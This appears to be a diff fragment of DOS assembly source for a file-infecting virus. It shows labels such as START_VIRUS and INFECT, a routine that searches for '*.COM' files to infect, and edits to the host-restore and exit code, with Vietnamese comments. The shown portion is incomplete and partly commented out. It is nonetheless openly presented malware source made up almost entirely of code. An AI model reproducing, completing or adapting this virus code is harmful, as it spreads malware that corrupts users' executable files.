@@ -15,13 +15,13 @@ VIRUS:       ;virus label
 DATA_ARRAY DB 0,0,0,0,0    
 
 START_VIRUS:
-    call EXECUTE
+    call INFECT                 ; return to host      
+     
     
-EXECUTE:    
+INFECT:    
     pop di   
-    sub di,offset EXECUTE
+    sub di,offset INFECT
     call FIND_FILE 
-           
 FIND_FILE:
 ;    push bp
 ;    sub sp,43H
@@ -92,16 +92,20 @@ CLOSE_FILE:
     int 21H         ;search for next file
     jmp FIND_LOOP  
          
-DONE:
-;    mov ah,1AH                      ; restore DTA
+DONE:             
+;    mov ah,1AH
 ;    mov dx,80H
-;    int 21H                              
-;    mov si,offset START             ; restore 
+;    int 21H    
+;    mov si,OFFSET START
+;    add di,word ptr [di+DATA_ARRAY] 
 ;    push si
+;    xchg si,di
 ;    movsw
 ;    movsw
 ;    movsb     
-    ret                             ; tra lai access cho host
+    mov     ax,4C00H
+    int     21H
+    ret                          ; tra lai access cho host
         
     
 COM_FILE    DB      '*.COM',0
